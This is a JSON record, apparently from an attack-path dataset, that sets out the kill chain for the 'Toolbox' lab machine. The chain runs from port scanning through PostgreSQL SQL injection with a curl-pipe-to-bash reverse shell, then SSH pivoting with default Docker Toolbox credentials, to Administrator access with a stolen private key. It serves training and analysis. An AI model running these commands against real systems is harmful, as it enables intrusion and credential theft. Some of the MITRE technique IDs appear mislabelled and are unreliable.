@@ -1,0 +1,284 @@
+{
+  "id": "ap-0013",
+  "title": "PostgreSQL SQLi RCE leading to Docker Lateral Movement and Windows Host Compromise",
+  "summary": "Exploitation of a web application vulnerable to SQL injection over PostgreSQL to achieve remote command execution, pivot into a Docker container, and compromise the main Windows host using discovered SSH keys.",
+  "attack_path_markdown": "### Step 1\nReconnaissance: Identify open services and target OS.\n### Step 2\nExploitation: Execute PostgreSQL SQLi to achieve RCE and establish a reverse shell into a Docker container.\n### Step 3\nLateral Movement: Discover shared SSH keys in the container's file system, allowing access to the main Windows host as Administrator.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Initial target scanning to determine operating system, open ports, and running services.",
+      "actions": [
+        "Validate target activity and determine approximate Time To Live (TTL) for OS hint.",
+        "Execute an exhaustive TCP port scan.",
+        "Run service version detection scripts against identified open ports.",
+        "Perform SMB enumeration to identify architecture, hostname, and potential shares."
+      ],
+      "tools": [
+        "ping",
+        "nmap",
+        "crackmapexec",
+        "smbclient"
+      ],
+      "techniques": [
+        "Active Scanning (T1595.001)",
+        "Network Service Scanning (T1046)",
+        "OS Fingerprinting (T1589.001)"
+      ],
+      "mitre_ids": [
+        "T1595.001",
+        "T1046"
+      ],
+      "indicators": [
+        "TTL 127/128 (Windows OS)",
+        "Open Ports: 21 (FTP), 22 (SSH), 80/443 (HTTP/S), 135, 139, 445 (SMB)",
+        "Hostname: TOOLBOX (Windows 10, 64-bit)"
+      ],
+      "preconditions": "Network connectivity to the target IP address.",
+      "expected_outcome": "Identification of vulnerable web service running over HTTPS/443 (admin.megalogistic.com) and the underlying PostgreSQL database.",
+      "confidence": 1.0,
+      "commands": [
+        "ping -c 1 <IP>",
+        "nmap -p- -T5 --min-rate 5000 -v -n -Pn -oG all_ports <IP>",
+        "nmap -sV -sC -p 21,22,80,135,139,443,445 -oN target.nmap <IP>",
+        "crackmapexec smb <IP>"
+      ]
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Preparation of the reverse shell payload and the SQL injection structure for remote command execution (RCE).",
+      "actions": [
+        "Develop a shell script (e.g., 'test') containing a Bash reverse shell payload for Linux containers, targeting the attacker's listener.",
+        "Set up a Python HTTP server to host the payload file for delivery.",
+        "Prepare a Netcat listener on the chosen port to catch the connection."
+      ],
+      "tools": [
+        "python",
+        "netcat"
+      ],
+      "techniques": [
+        "Standard RCE Payload Construction",
+        "Bash Reverse Shell"
+      ],
+      "mitre_ids": [
+        "T1059.004",
+        "T1021.006"
+      ],
+      "indicators": [
+        "Reverse shell script (`test`) hosted and ready for download.",
+        "Listener active."
+      ],
+      "preconditions": "Attacker machine configured with an accessible IP and open ports for C2.",
+      "expected_outcome": "Payload ready for injection and execution on the target system.",
+      "confidence": 1.0,
+      "commands": [
+        "python -m http.server 80",
+        "nc -lvnp 443"
+      ]
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Inject a preliminary SQL query into the web application's login form to confirm the vulnerability and identify the backend database technology (PostgreSQL).",
+      "actions": [
+        "Intercept the login request using a proxy tool.",
+        "Inject a single quote (') to trigger a syntax error.",
+        "Inject a time delay payload to confirm blind SQL injection vulnerability."
+      ],
+      "tools": [
+        "Burp Suite/Repeater"
+      ],
+      "techniques": [
+        "SQL Injection (T1190)",
+        "Input Manipulation"
+      ],
+      "mitre_ids": [
+        "T1190"
+      ],
+      "indicators": [
+        "Error message confirming PostgreSQL database.",
+        "Time delay confirming vulnerability (e.g., 10-second pause)."
+      ],
+      "preconditions": "Access to the web application's login form.",
+      "expected_outcome": "Confirmed vulnerability to SQL injection and RCE potential.",
+      "confidence": 1.0,
+      "commands": [
+        "'; select pg_sleep(10); --"
+      ]
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Exploit the PostgreSQL SQL injection vulnerability to enable remote command execution (RCE) and execute the staged reverse shell payload.",
+      "actions": [
+        "Inject SQL commands to create or reference a dynamic table for command execution (e.g., 'cmd_exec').",
+        "Use the RCE capability to execute a command (`curl`) to download the reverse shell script (`test`).",
+        "Pipe the downloaded script into a command interpreter (`bash`) to gain initial access."
+      ],
+      "tools": [
+        "Burp Suite/Repeater"
+      ],
+      "techniques": [
+        "SQL Injection (T1213)",
+        "Command and Scripting Interpreter (T1059)"
+      ],
+      "mitre_ids": [
+        "T1213",
+        "T1059.004"
+      ],
+      "indicators": [
+        "Successful creation of the RCE table (confirmed by checking for 'already exists').",
+        "HTTP GET request received by the attacker's server for the 'test' file."
+      ],
+      "preconditions": "Confirmed SQLi vulnerability and version compatibility for RCE technique.",
+      "expected_outcome": "Successful establishment of a reverse shell connection to the target system (Docker container).",
+      "confidence": 1.0,
+      "commands": [
+        "SQL to create `cmd_exec` table (complex injection string)",
+        "SQL injection payload incorporating `curl 10.10.14.29/test | bash` (or similar execution chain)"
+      ]
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Stabilizing the shell received from the Docker container.",
+      "actions": [
+        "Use standard TTY manipulation commands to obtain an interactive and stable shell environment."
+      ],
+      "tools": [
+        "stty",
+        "script",
+        "reset"
+      ],
+      "techniques": [
+        "Non-Standard Shell (T1059.004)"
+      ],
+      "mitre_ids": [
+        "T1059.004"
+      ],
+      "indicators": [
+        "Interactive TTY session established (e.g., ability to use Ctrl+C/Ctrl+L)."
+      ],
+      "preconditions": "Initial low-privilege shell established.",
+      "expected_outcome": "Stable command line interface within the container.",
+      "confidence": 1.0,
+      "commands": [
+        "script /dev/null -c bash",
+        "stty raw -echo",
+        "fg",
+        "reset xterm",
+        "export TERM=xterm"
+      ]
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Using discovered default credentials to establish an SSH session for lateral movement to another internal host/container.",
+      "actions": [
+        "Identify default credentials associated with 'docker toolbox' (user: 'docker', password: 'tcuser').",
+        "Use SSH to connect to the internal network gateway/interface (e.g., 172.17.0.1) using the default credentials."
+      ],
+      "tools": [
+        "ssh"
+      ],
+      "techniques": [
+        "Default Credentials (T1589.004)",
+        "Remote Services: SSH (T1021.004)"
+      ],
+      "mitre_ids": [
+        "T1589.004",
+        "T1021.004"
+      ],
+      "indicators": [
+        "Successful authentication to the internal host as user 'docker'."
+      ],
+      "preconditions": "Initial container access achieved.",
+      "expected_outcome": "Lateral access to a secondary internal host or container.",
+      "confidence": 1.0,
+      "commands": [
+        "ssh docker@172.17.0.1"
+      ]
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Privilege escalation and full host compromise by leveraging shared volumes/directories to access the Windows Administrator’s SSH private key.",
+      "actions": [
+        "Enumerate file systems on the internal host and locate directories shared with the Windows host (e.g., 'C' drive structure under `/users/administrator`).",
+        "Retrieve the Administrator’s private SSH key (`id_rsa`) from the `.ssh` folder within the shared structure.",
+        "Set the correct permissions for the private key (`chmod 600 id_rsa`).",
+        "Use the private key to authenticate via SSH to the main Windows target host as 'Administrator' (Windows OpenSSH).",
+        "Locate and extract the final sensitive file (`root.txt`)."
+      ],
+      "tools": [
+        "ls",
+        "find",
+        "chmod",
+        "ssh"
+      ],
+      "techniques": [
+        "Credentials from Password Store (T1555.004)",
+        "Lateral Movement (T1021.004)",
+        "Exploitation for Privilege Escalation (T1068)"
+      ],
+      "mitre_ids": [
+        "T1555.004",
+        "T1068"
+      ],
+      "indicators": [
+        "Discovery of `id_rsa` file.",
+        "Successful SSH connection to the main target IP as 'Administrator'.",
+        "Recovery of the `root.txt` flag."
+      ],
+      "preconditions": "Access to the internal host/container with visibility into shared Windows directories.",
+      "expected_outcome": "Full compromise of the Windows host and achievement of the final objective.",
+      "confidence": 1.0,
+      "commands": [
+        "chmod 600 id_rsa",
+        "ssh -i id_rsa Administrator@10.10.10.236",
+        "dir root.txt"
+      ]
+    }
+  ],
+  "tactics": [
+    "Reconnaissance",
+    "Initial Access",
+    "Execution",
+    "Persistence",
+    "Lateral Movement",
+    "Credential Access",
+    "Privilege Escalation"
+  ],
+  "techniques": [
+    "SQL Injection",
+    "Remote Services: SSH",
+    "Credentials from Password Store",
+    "Exploitation for Privilege Escalation"
+  ],
+  "mitre_ids": [
+    "T1190",
+    "T1021.004",
+    "T1555.004",
+    "T1068"
+  ],
+  "hosts": [
+    "10.10.10.236 (Windows Host)",
+    "172.17.0.2 (Initial Container)",
+    "172.17.0.1 (Secondary Host/Container)"
+  ],
+  "privs_obtained": [
+    "Container user (low-priv)",
+    "Administrator (Windows Host)"
+  ],
+  "confidence": 1.0,
+  "source_file": "",
+  "notes": "Procedure followed the resolution of the 'Toolbox' machine, combining SQLi RCE, Docker pivoting, and SSH key reuse.",
+  "labels": [
+    "attack_path",
+    "sqli",
+    "postgresql",
+    "docker",
+    "lateral_movement"
+  ]
+}
